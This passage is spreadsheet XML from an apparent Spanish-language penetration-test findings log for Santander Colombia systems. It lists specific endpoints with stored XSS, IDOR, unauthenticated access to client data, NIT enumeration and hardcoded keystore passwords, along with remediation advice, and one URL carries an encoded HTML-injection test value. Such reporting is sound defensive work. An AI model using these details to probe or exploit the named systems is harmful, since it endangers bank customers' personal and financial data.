El protocolo incorpora una cabecera HTTP "HSTS" (HTTP Strict Transport Security) enviada desde el servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y  subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacena_x0002_das en el navegador durante un tiempo determinado que se establece en la propia cabecera de respuesta.</t>
  </si>
  <si>
    <t>En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor 
web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web 
y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y 
servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas.</t>
  </si>
  <si>
    <t>Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta "HSTS" 
en todas las respuestas del servidor. La sintaxis para ello es:
 Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains] 
El parámetro "max-age" especifica el tiempo requerido para usar HTTPS y debería ser un número 
alto, del orden de varios meses. La flag "includeSubDomains" define que la política aplica también a 
los subdominios</t>
  </si>
  <si>
    <t>MAN-69c280862813d3056436575e</t>
  </si>
  <si>
    <t>MAN-69b3121976713a70a19f6208</t>
  </si>
  <si>
    <t>MAN-69c1773c2813d3056436488a</t>
  </si>
  <si>
    <t>MAN-69c280f62813d3056436575f</t>
  </si>
  <si>
    <t>QA-WAS-e8cd995b-4eef-40d7-b4cd-a7bc21880197</t>
  </si>
  <si>
    <t>QA-WAS-23100498-a870-4e8f-a62f-e1149f5dfeac</t>
  </si>
  <si>
    <t>QA-WAS-d6624a6d-4054-4abd-b5b5-9425acbb23ad</t>
  </si>
  <si>
    <t>QA-WAS-9e4d8df4-996d-4606-ac4c-99ccbf8c0f0e</t>
  </si>
  <si>
    <t>QA-WAS-b4cb6913-f5df-4d0c-8872-57cd77db97b3</t>
  </si>
  <si>
    <t>QA-WAS-c73fc78c-a440-4017-83e5-918700dc4b13</t>
  </si>
  <si>
    <t>QA-WAS-7e266dbf-e03d-42aa-832b-6d7601151b68</t>
  </si>
  <si>
    <t>QA-WAS-60dde24c-addf-4906-8f81-382b0c5d859d</t>
  </si>
  <si>
    <t>QA-WAS-84e52cd1-6030-4ec2-9dab-bf8f32ab37e6</t>
  </si>
  <si>
    <t>QA-WAS-f68c703c-ef9d-4021-b771-6c1beaf2b232</t>
  </si>
  <si>
    <t>QA-WAS-21ef66b4-f034-4274-b464-b7de1d4728a3</t>
  </si>
  <si>
    <t>QA-WAS-defba4cb-5624-4777-8244-0996e33270f7</t>
  </si>
  <si>
    <t>QA-WAS-04115b0f-ea6a-4f44-bca8-8dcd8e43a9b9</t>
  </si>
  <si>
    <t>QA-WAS-0f11466e-43bb-464d-bdaa-4056b514d619</t>
  </si>
  <si>
    <t>QA-VM-2455376390591551191</t>
  </si>
  <si>
    <t>QA-VM--1251281810878723290</t>
  </si>
  <si>
    <t>QA-VM--5118819666516968506</t>
  </si>
  <si>
    <t>QA-VM-8586184057398410764</t>
  </si>
  <si>
    <t>QA-VM--999889811601462579</t>
  </si>
  <si>
    <t>QA-VM--720111118526219180</t>
  </si>
  <si>
    <t>QA-VM-7685521894562521108</t>
  </si>
  <si>
    <t>QA-VM-6614836549189013734</t>
  </si>
  <si>
    <t>QA-VM--7025472626260108482</t>
  </si>
  <si>
    <t>QA-VM--593303555179963897</t>
  </si>
  <si>
    <t>QA-VM--4960984737177022586</t>
  </si>
  <si>
    <t>api.hubapi.com</t>
  </si>
  <si>
    <t>api-auto.hubapi.com</t>
  </si>
  <si>
    <t>eu1.mx.hubapi.com</t>
  </si>
  <si>
    <t>zorse-na1.hubapi.com</t>
  </si>
  <si>
    <t>candidate.hubapi.com</t>
  </si>
  <si>
    <t>zorse.hubapi.com</t>
  </si>
  <si>
    <t>users.hubapi.com</t>
  </si>
  <si>
    <t>users-na1.hubapi.com</t>
  </si>
  <si>
    <t>public.hubapi.com</t>
  </si>
  <si>
    <t>public-na1.hubapi.com</t>
  </si>
  <si>
    <t>feedback.hubapi.com</t>
  </si>
  <si>
    <t>nav.hubapi.com</t>
  </si>
  <si>
    <t>feedback-eu1.hubapi.com</t>
  </si>
  <si>
    <t>zorse-eu1.hubapi.com</t>
  </si>
  <si>
    <t>edge-kv-na1.hubapi.com</t>
  </si>
  <si>
    <t>edge-kv.hubapi.com</t>
  </si>
  <si>
    <t>nav-eu1.hubapi.com</t>
  </si>
  <si>
    <t>public-eu1.hubapi.com</t>
  </si>
  <si>
    <t>breb.api.pre.santander.com.co</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   Se ha detectado una falta de medidas o controles para detectar y mitigar los intentos de automatización maliciosa en el activo. La automatización maliciosa se refiere al uso de herramientas automatizadas o scripts para llevar a cabo actividades fraudulentas, como el envío masivo de solicitudes o ataques de fuerza bruta.   La ausencia de dichos mecanismos ha permitido realizar una enumeración proporcionando distintos identificadores.   DETALLE   SCBD-2025-CNMPO-013-AP-001:   Durante la realización de las pruebas, se ha detectado que es posible obtener la información asociada a diferentes NIT (Número de Identificación Tributaria). La ausencia de mecanismos que limiten el envío de múltiples peticiones ha permitido realizar una enumeración dentro del sistema, proporcionando diferentes NIT.   El envío de la siguiente petición hacía la aplicación permite obtener los datos asociados al NIT “8917000379”, tal y como se muestra en la siguiente evidencia.      Ilustración 2 Petición para obtener el registro asociado al NIT 8917000379   El servidor responde a la petición enviada proporcionando el valor asociado a dicho NIT, tal y como se puede observar en la siguiente evidencia.      Ilustración 3 Información asociada al registro NIT 8917000379   Posteriormente, se ha realizado el envío de múltiples peticiones en un corto intervalo de tiempo, con el fin de poder encontrar datos asociados a diferentes NIT, tal y como se puede observar en la siguiente captura, se ha realizado el envío de 592 peticiones y se ha obtenido 3 registros asociados.      Ilustración 4 Envío de múltiples peticiones.       RIESGO   La ausencia de un mecanismo anti-automatización puede tener los siguientes impactos negativos en la seguridad:   Sin un mecanismo para detectar y bloquear los intentos de fuerza bruta, un atacante puede realizar una gran cantidad de intentos de inicio de sesión o de adivinación de contraseñas sin restricciones. Esto aumenta las posibilidades de que un atacante pueda acceder ilegalmente a cuentas de usuario o a recursos protegidos.   Los ataques automatizados pueden generar una alta carga en el sistema, consumiendo recursos como ancho de banda, capacidad de procesamiento y memoria. Esto puede llevar a una degradación del rendimiento y, en casos extremos, a la indisponibilidad del sistema para los usuarios legítimos.</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   La vulnerabilidad de Cross Site Scripting (XSS) almacenado o persistente hace referencia a la posibilidad de inyectar código JavaScript en datos controlados por el usuario, normalmente en el valor de los parámetros URL o de los formularios HTML. Estos datos son utilizados por la aplicación para generar contenido dinámicamente, que será presentado al navegador del usuario el cual interpretará el código inyectado.   DETALLE   Se ha identificado que no se codifican ciertos valores al ser almacenados, por lo que sería posible inyectar código HTML y/o JavaScript. Al no codificar los valores, una vez dichos valores sean recuperados de la base de datos y renderizados por el usuario, el código no codificado puede ser ejecutado en el navegador permitiendo la toma de control del navegador del usuario, desde la propia sesión del usuario, en la que se pueden llevar a cabo acciones como el robo de identificadores de sesión pudiendo dar lugar a la suplantación de la identidad del usuario.   A modo de evidencia se muestra como se introduce código JavaScript:      Dicho endpoint devuelve un código de creación, indicando los valores almacenados, donde se ve que no se ha codificado y un identificador:          Tras ser almacenado, si se solicita el elemento creado por su identificador, se observa como el contenido contiene el valor no codificado:          Si la aplicación que solicita el valor al endpoint, no codifica adecuadamente el valor devuelto, este será interpretado por el navegador ejecutándose código JavaScript en el navegador del usuario.       NOTA: Como no se conoce la aplicación que va a utilizar la API, no se puede determinar el riesgo final de la vulnerabilidad. Sin embargo, se recomienda que estos valores sean almacenados codificados para evitar el riesgo.       SC-26-CNMP0-001-AP-001-001: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   Parámetro:   - content         SC-26-CNMP0-001-AP-001-002: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   Parametro:   - hs_pipeline_stage             SC-26-CNMP0-001-AP-001-003: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   Parámetro:   - subject             SC-26-CNMP0-001-AP-001-004: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https://api.hubapi.com/crm/v3/objects/tickets/20085607730ojvio%3ca%20b%3dc%3ez0upo?archived=false            SC-26-CNMP0-001-AP-001-005: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https://api.hubapi.com/files/v3/folders       Parámetro:   - name             SC-26-CNMP0-001-AP-001-006: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https://api.hubapi.com/files/v3/folders   Parámetro:   - parentPath              RIESGO   Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes acciones:      - Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario que, normalmente, se encuentra almacenado a través de una cookie.   - Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible.   - Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el sistema de la víctima.   - Ejecución de acciones de forma "transparente" para el usuario: Interactuar con la aplicación y realizar acciones sin el conocimiento del usuario.</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   Muchas de las acciones o funcionalidades que presentan las aplicaciones requieren establecer límites en el número de veces que se puede realizar una determinada funcionalidad o acción. Las aplicaciones deben controlar que un usuario no pueda exceder un límite en el uso de estas funcionalidades ya que, en determinados casos, cada vez que se utiliza la funcionalidad afectada en el aplicativo, el usuario puede obtener algún tipo de beneficio o causar algún tipo de acción no deseada sobre la aplicación. Por ejemplo: un sitio de comercio electrónico solo puede permitir que los usuarios apliquen un descuento una vez por transacción o se pueda valorar y/o comentar una única vez cada producto obtenido.   Las vulnerabilidades relacionadas con las pruebas de los límites de función son específicas de cada aplicación en concreto y diseñar pruebas acorde a la funcionalidad y acciones de la propia aplicación.   Un atacante podría eludir la lógica de negocio y ejecutar una funcionalidad más veces de las permitidas obteniendo algún tipo de beneficio o acción malintencionada en la aplicación.   DETALLE   La ausencia de controles para prevenir que una determinada acción pueda ser utilizada un número determinado de veces puede ser aprovechada por un atacante para realizar acciones no deseadas en la aplicación.   En este caso particular, la aplicación no controla el número de veces que un usuario puede realizar la acción de inicio de sesión obteniendo un comportamiento no deseado en la aplicación.   A continuación, se muestra evidencia del resultado de realizar la acción afectada un gran número de veces en un corto espacio de tiempo.         Ilustración 4 - Request      Ilustración 5 - Response      Ilustración 6 - Ausencia de controles de automatización       RIESGO   La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario, ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de descuento y otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación.</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   Se ha detectado que la aplicación devuelve información acerca de la infraestructura utilizada para sustentar a la propia aplicación, más concretamente de nginx,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DETALLE   Durante las pruebas realizadas se ha comprobado que las cabeceras de la respuesta a la petición revelan información interna acerca del tipo de servidor y versión del mismo.       A continuación, se incluye una evidencia de ejemplo que muestra la información del servidor expuesta.                                          Ilustración 2 - Revelación de información de servidor       RIESGO   Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t xml:space="preserve">  RECOMENDACIÓN   Se recomienda implementar medidas para evitar que ningún mecanismo automático pueda realizar el proceso de autenticación en la aplicación, como por ejemplo un sistema reCAPTCHA, que consiste en una prueba de desafío-respuesta utilizada en computación para determinar cuándo un usuario es o no humano.</t>
  </si>
  <si>
    <t xml:space="preserve">  Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por los usuarios, de forma que se valide adecuadamente la información transmitida a través de los mismos.   Existen dos estrategias generales para implantar este filtro:      - Filtrado de lista blanca: Se valida la información recibida en función de la información esperada.   - Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código JavaScript. Esta lista de caracteres podría ser “’”, “&lt;”, “&gt;”, “)”, “(“, “”” y la cadena “script”.      De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga una complejidad alta, se recomienda utilizar una estrategia basada en listas negras.   Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que el navegador del usuario interprete código JavaScript debido a una inyección de código, una posibilidad sería renderizar caracteres especiales como HTML Entities.</t>
  </si>
  <si>
    <t xml:space="preserve">  La aplicación debe controlar la lógica de negocio para garantizar que una determinada funcionalidad o acción solo puede ejecutarse un cierto número de veces limitado, cuando se alcance el límite establecido, el usuario ya no puede ejecutar la funcionalidad.   Dependiendo de la acción afectada se controlará el número de veces que una acción se puede utilizar, o las veces que se puede utilizar en un determinado intervalo de tiempo.</t>
  </si>
  <si>
    <t xml:space="preserve">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t>
  </si>
  <si>
    <t>Cross Site Scripting Almacenado</t>
  </si>
  <si>
    <t>Ausencia de controles anti-automatización</t>
  </si>
  <si>
    <t>PRYECTO</t>
  </si>
  <si>
    <t>MAN-69a7f18d76713a70a18d56ca</t>
  </si>
  <si>
    <t>MAN-69a7f22f76713a70a18d56cb</t>
  </si>
  <si>
    <t xml:space="preserve">Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría 
almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes 
acciones:  
  - Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario 
que, normalmente, se encuentra almacenado a través de una cookie.   - Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información 
sensible.  - Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar 
vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la 
víctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer 
totalmente el sistema de la víctima. </t>
  </si>
  <si>
    <t xml:space="preserve">SC-26-CNMP0-001-AP-001 </t>
  </si>
  <si>
    <t xml:space="preserve">SC-26-CNMPA-004-AP-001 </t>
  </si>
  <si>
    <t>SC-26-CNMPA-004-AP-002</t>
  </si>
  <si>
    <t>SC-26-CNMPA-004-AP-003</t>
  </si>
  <si>
    <t>SC-26-CNMPA-004-AP-004</t>
  </si>
  <si>
    <t>SC-26-CNMPA-004-AP-005</t>
  </si>
  <si>
    <t>Fuga de información de uso de la tecnología ASP.NET</t>
  </si>
  <si>
    <t>Autocompletado de formularios habilitado</t>
  </si>
  <si>
    <t xml:space="preserve">La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque 
como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario, 
ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de descuento y 
otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación. </t>
  </si>
  <si>
    <t xml:space="preserve"> </t>
  </si>
  <si>
    <t xml:space="preserve">Conocer tipo concreto del la tecnología interna utilizada para sustentar el aplicativo, y su versión, 
permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas 
así como generar ataques más elaborados contra la plataforma. </t>
  </si>
  <si>
    <t xml:space="preserve">Se recomienda evitar que la aplicación no devuelva al usuario información relativa a las tecnologías 
que usa. Para ello es necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y 
mensajes de error que divulguen este tipo de información. </t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado que la aplicación devuelve información acerca de la infraestructura utilizada para  sustentar a la propia aplicación.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t>
  </si>
  <si>
    <t xml:space="preserve">La cabecera "CSP" (Content Security Policy) permite al navegador del usuario controlar los recursos JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la carga de scripts en la página. </t>
  </si>
  <si>
    <t xml:space="preserve">La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una 
vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t xml:space="preserve">Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y 
observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e 
incluirlos en la cabecera, ya que la propia cabecera "Content Security Policy" va a actuar como una 
lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web.   
Es necesario configurar el servidor web para que devuelva la cabecera HTTP "Content-Security
Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se 
trata de una versión antigua y no es necesario configurarla).   </t>
  </si>
  <si>
    <t>Se ha detectado que la función "autocompletar" se encuentra habilitada en el formulario de autenticación del usuario.  
Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la 
aplicación. Así mismo, un atacante que dispusiera de acceso remoto al equipo también podría acceder a estos datos de inicio de sesión.</t>
  </si>
  <si>
    <t xml:space="preserve">Un usuario que acceda al aplicativo desde un ordenador público, o que sea utilizado por terceros, 
permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la aplicación.  </t>
  </si>
  <si>
    <t>Se recomienda añadir la directiva "autocomplete=off" en todos los campos que contengan 
información sensible que vaya a ser enviada a la aplicación. De esta manera se evita que esta 
información sea almacenada por el navegador y posteriormente recuperada por un tercero con 
acceso al navegador del usuario.</t>
  </si>
  <si>
    <t>Alejandra Rodrigez</t>
  </si>
  <si>
    <t>ADMINFO</t>
  </si>
  <si>
    <t>SC-26-CNMPA-003-VE-001</t>
  </si>
  <si>
    <t>SC-26-CNMPA-003-VE-002</t>
  </si>
  <si>
    <t>https://santander.adminfo.net/</t>
  </si>
  <si>
    <t>La vulnerabilidad "BREACH" es una instancia del ataque CRIME contra la compresión HTTP de tipo  "gzip" o "DEFLATE"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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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(Cipher-Block_x0002_Chaining) son potencialmente vulnerables a este tipo ataques. 
CVEs Asociados: 
•CVE-2013-0169</t>
  </si>
  <si>
    <t xml:space="preserve">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t>
  </si>
  <si>
    <t>SC-26-CNMPO-005-CO-001</t>
  </si>
  <si>
    <t xml:space="preserve">https://recidaw.olimpiait.com </t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado que la aplicación devuelve información acerca de la aplicación y/o framework de  programación utilizada para sustentar a la propia aplicación, así como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t>
  </si>
  <si>
    <t xml:space="preserve">Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo permite a 
un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como 
generar ataques más elaborados contra la plataforma. </t>
  </si>
  <si>
    <t xml:space="preserve">Se recomienda evitar que la aplicación devuelva al usuario información relativa al 
software/framework y versión utilizada para desarrollar la propia aplicación.  Para ello es necesario 
eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen 
este tipo de información. </t>
  </si>
  <si>
    <t>Juan Pablo Vargas</t>
  </si>
  <si>
    <t>SC-26-CNMPO-009-AP-001</t>
  </si>
  <si>
    <t>SC-26-CNMPO-009-AP-002</t>
  </si>
  <si>
    <t>Acceso a información sensible de clientes sin autenticación</t>
  </si>
  <si>
    <t>Referencia Directa a Objeto Insegura (IDOR)</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/customerInformationByOperation?operation=ID_CREDITO</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/validarPdf</t>
  </si>
  <si>
    <t>Se ha identificado una vulnerabilidad de tipo Referencia Directa a Objeto Insegura (IDOR) que afecta significativamente a la funcionalidad de obtención de documentos de extractos financieros. Esta deficiencia de seguridad permite que un atacante, tras autenticarse como un usuario legítimo, pueda burlar los controles de autorización y proceder a descargar documentos de carácter confidencial pertenecientes a otros clientes del sistema sin realizar la debida verificación de la identidad del solicitante. Específicamente, al interactuar con el endpoint encargado de validar la solicitud de un extracto, el sistema no implementa una validación estricta del contexto de usuario asociado a la petición, lo que facilita la extracción no autorizada de datos sensibles.</t>
  </si>
  <si>
    <t>Se ha identificado una vulnerabilidad alta de acceso a información personal identificable (PII) de clientes sin requerir ninguna forma de autenticación o autorización. El problema reside en el backend de la API de información del cliente, específicamente en un endpoint destinado a consultar detalles de créditos y préstamos.</t>
  </si>
  <si>
    <t>El impacto de esta vulnerabilidad es alto, ya que compromete directamente la confidencialidad de los datos de los clientes. Un atacante podría acceder masivamente a información personal identificable (PII), lo que podría derivar en fraudes, robo de identidad o incumplimiento de normativas de protección de datos. Además, la exposición de información sensible puede facilitar ataques posteriores, como phishing dirigido, ingeniería social o escalada de privilegios dentro del sistema. En entornos regulados, este tipo de incidente puede conllevar sanciones legales significativas, daños reputacionales y pérdida de confianza por parte de los usuarios.</t>
  </si>
  <si>
    <t>Se recomienda implementar controles de autenticación y autorización robustos en todos los endpoints que gestionen información sensible. Cada solicitud debe validar explícitamente la identidad del usuario y verificar que tenga permisos adecuados para acceder al recurso solicitado. Es fundamental aplicar el principio de "deny by default", asegurando que ningún recurso sea accesible sin autenticación salvo que esté explícitamente permitido. También se deben realizar revisiones de código y pruebas de seguridad para identificar endpoints expuestos.</t>
  </si>
  <si>
    <t>El riesgo asociado a esta vulnerabilidad es elevado, ya que puede permitir a un atacante acceder, modificar o eliminar información sensible de otros usuarios o de la propia aplicación. Dependiendo del tipo de recurso afectado, esto podría derivar en exposición de datos personales, credenciales, historiales de transacciones o documentos internos críticos. Además, la explotación de un IDOR puede facilitar ataques adicionales, como la escalada de privilegios dentro de la aplicación o el acceso a funcionalidades restringidas. En entornos con múltiples niveles de usuarios o datos sensibles, el impacto puede ser crítico.</t>
  </si>
  <si>
    <t>Se recomienda implementar controles de autorización sólidos en todas las rutas y funcionalidades que permitan acceder a recursos internos. Los identificadores utilizados por la aplicación no deben ser predecibles ni manipulables directamente por los usuarios; en su lugar, se pueden emplear identificadores aleatorios o codificados que no revelen información sobre otros objetos. Asimismo, se debe validar siempre que el usuario autenticado tiene permisos suficientes para acceder o modificar el recurso solicitado. Las revisiones de código y las pruebas de seguridad deben centrarse en detectar posibles rutas de acceso directo a objetos internos y corregirlas mediante políticas de control de acceso basadas en roles o atributos.</t>
  </si>
  <si>
    <t>APP</t>
  </si>
  <si>
    <t>SC-26-MPO-014-001</t>
  </si>
  <si>
    <t>Credenciales de Keystore embebidas en el código fuente de la aplicación</t>
  </si>
  <si>
    <t>APP Santander Token</t>
  </si>
  <si>
    <t>La aplicación móvil contiene credenciales sensibles estáticas directamente en el código 
fuente compilado. Al analizar el archivo, se observa que la clase BuildConfig expone las variables RELEASE_KEY_PASSWORD y RELEASE_STORE_PASSWORD en texto plano. Un usuario malintencionado podría aplicar ingeniería inversa al archivo APK utilizando herramientas públicas para extraer estos valores de manera directa.</t>
  </si>
  <si>
    <t>Al obtener las credenciales del keystore de firma, un usuario malintencionado podría firmar 
actualizaciones fraudulentas o versiones alteradas de la aplicación, distribuyéndolas 
engañosamente a un usuario legítimo. Esto podría provocar una vulneración total de la 
integridad del software, accesos no autorizados a dispositivos e información confidencial, y un 
daño crítico a la reputación corporativa.</t>
  </si>
  <si>
    <t>Se deben eliminar todas las credenciales estáticas del código fuente. Es necesario 
implementar entornos de compilación seguros donde los secretos se inyecten durante el 
proceso de integración y despliegue continuo (CI/CD) mediante variables de entorno, evitando 
que formen parte de las clases del empaquetado final. Adicionalmente, se sugiere emplear 
herramientas de ofuscación de código como ProGuard o R8 para entorpecer el análisis del 
archivo.</t>
  </si>
  <si>
    <t>QA-WAS-28539897-9a87-4827-8618-ef3e46000b8b</t>
  </si>
  <si>
    <t>QA-WAS-0434fc46-345b-4751-bc00-b8ae94445e71</t>
  </si>
  <si>
    <t>breb</t>
  </si>
  <si>
    <t>https://lynx.api.santander.com.co/</t>
  </si>
  <si>
    <t>https://sos.api.pre.santander.com.co/</t>
  </si>
  <si>
    <t>MAN-69e8f55735e4b16928f42065</t>
  </si>
  <si>
    <t>MAN-69e8f59c35e4b16928f42068</t>
  </si>
  <si>
    <t>SCO-26-CNMPO-012-CO-001</t>
  </si>
  <si>
    <t>SCO-26-CNMPO-012-CO-002</t>
  </si>
  <si>
    <t>Cookie de sesión transmitida sin el atributo Secure establecido</t>
  </si>
  <si>
    <t>https://simplefinance.santanderfinancing.com:4443/SimpleFinance/login</t>
  </si>
  <si>
    <t>La aplicación auditada emite la cookie de sesión JSESSIONID sin el atributo Secure, lo que permite  que el navegador la transmita tanto por HTTP como por HTTPS. En la práctica, esto significa que si  un usuario accede por un canal no cifrado, ya sea por redirección, por error de configuración o de  forma intencionada por un atacante, la cookie viaja en claro y puede ser capturada.</t>
  </si>
  <si>
    <t>Un atacante con capacidad para interceptar tráfico de red, mediante ARP spoofing en una red local 
o posicionándose en un punto intermedio de la comunicación, podría capturar el valor de la 
JSESSIONID y reutilizarlo para autenticarse en la aplicación sin necesidad de credenciales. El impacto 
directo es el secuestro de sesiones de usuarios autenticados.</t>
  </si>
  <si>
    <t>La corrección pasa por añadir el atributo Secure a todas las cookies de sesión, de modo que el 
navegador únicamente las envíe sobre conexiones HTTPS. En aplicaciones Java, esto se configura 
en el xml.
Conviene revisar también el resto de las cookies de la aplicación y confirmar que HttpOnly está 
igualmente presente para evitar el acceso desde JavaScript.</t>
  </si>
  <si>
    <t>Enumeración de usuarios a través del formulario de recuperación de contraseña</t>
  </si>
  <si>
    <t>La funcionalidad de recuperación de contraseña de la aplicación devuelve mensajes de respuesta distintos en función de si el usuario introducido existe o no en el sistema. Este comportamiento permite a un atacante determinar qué cuentas de usuario están registradas en la plataforma sinnecesidad de autenticación previa, únicamente observando la respuesta del servidor ante cada 
intento.</t>
  </si>
  <si>
    <t>Un atacante puede automatizar peticiones contra el formulario de recuperación de contraseña 
utilizando diccionarios de correos electrónicos o nombres de usuario comunes para identificar qué 
cuentas están activas en la plataforma. La información obtenida puede utilizarse como punto de 
partida para ataques posteriores de fuerza bruta, phishing dirigido o credential stuffing contra los 
usuarios identificados. El hecho de que el endpoint sea público y no requiera autenticación reduce 
considerablemente el coste del ataque para el adversario.</t>
  </si>
  <si>
    <t>La aplicación debe devolver un mensaje genérico e idéntico independientemente de si el usuario 
introducido existe o no en el sistema. Un ejemplo de mensaje apropiado sería del tipo "Si el correo 
está registrado, recibirás un enlace de recuperación en breve", que no revela información sobre la
existencia de la cuenta. Esta corrección debe aplicarse tanto al mensaje visible en la interfaz como 
a cualquier diferencia observable en los tiempos de respuesta, ya que una respuesta más lenta 
para usuarios existentes también puede ser explotada como canal lateral.</t>
  </si>
  <si>
    <t>SC-26-CNMPO-011-AP-001</t>
  </si>
  <si>
    <t>MAN-69e9ce7935e4b16928f426f4</t>
  </si>
  <si>
    <t>supernet</t>
  </si>
  <si>
    <t>https://www.santander.com.co/Empresas</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   El identificador de sesión almacenado en la cookie es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript o ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, si existen en el aplicativo vulnerabilidades de tipo Cross Site Scripting, un atacante podría usurpar el identificador de sesión del usuario con la finalidad de impersonar al usuario en el aplicativo.   DETALLE   SC-26-CNMPO-011-AP-001-001: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      Parámetro afectado:   - dtCookieflo1gyf2   - incap_ses_1689_2165754         SC-26-CNMPO-011-AP-001-002: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https://www.santander.com.co/Empresas/Resources/Icons/site.webmanifest      Parámetro afectado:   - dtCookieflo1gyf2   - incap_ses_1689_2165754         SC-26-CNMPO-011-AP-001-003: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https://www.santander.com.co/Empresas/index.html      Parámetro afectado:   - incap_ses_1689_2165754             SC-26-CNMPO-011-AP-001-004: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https://www.santander.com.co/Empresas/ngsw-worker.js      Parámetro afectado:   - incap_ses_268_2165754      SC-26-CNMPO-011-AP-001-005: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https://www.santander.com.co/Empresas/rb_bf10849rjg      Parámetro afectado:   - incap_ses_268_2165754             RIESGO   El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación.</t>
  </si>
  <si>
    <t xml:space="preserve">  Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad "HttpOnly". De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX).   La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación.</t>
  </si>
  <si>
    <t>MAN-69e9f5c235e4b16928f42c6c</t>
  </si>
  <si>
    <t>SCO-26-CNMPO-013-AP-001</t>
  </si>
  <si>
    <t>Errores no controlados por la Aplicación</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   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   DETALLE   SCO-26-CNMPO-013-AP-001-001:   La aplicación afectada no realiza una gestión adecuada de los mensajes de error producidos en el aplicativo. la siguiente evidencia muestra un error de tipo excepción no controlada que revela información acerca del framework utilizado para desarrollar la funcionalidad:      RIESGO   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t>
  </si>
  <si>
    <t>SCO-26-CNMPA-015-AP-001</t>
  </si>
  <si>
    <t>https://www.santanderconsumer.co/</t>
  </si>
  <si>
    <t>Conocer el tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite 
a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así 
como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t xml:space="preserve">SC-26-CNMPO-014-AP-002 </t>
  </si>
  <si>
    <t>SC-26-CNMPO-014-AP-003</t>
  </si>
  <si>
    <t>SC-26-CNMPO-014-AP-004</t>
  </si>
  <si>
    <t>SC-26-CNMPO-014-AP-005</t>
  </si>
  <si>
    <t>Implementación insegura de Certificate Pinning 
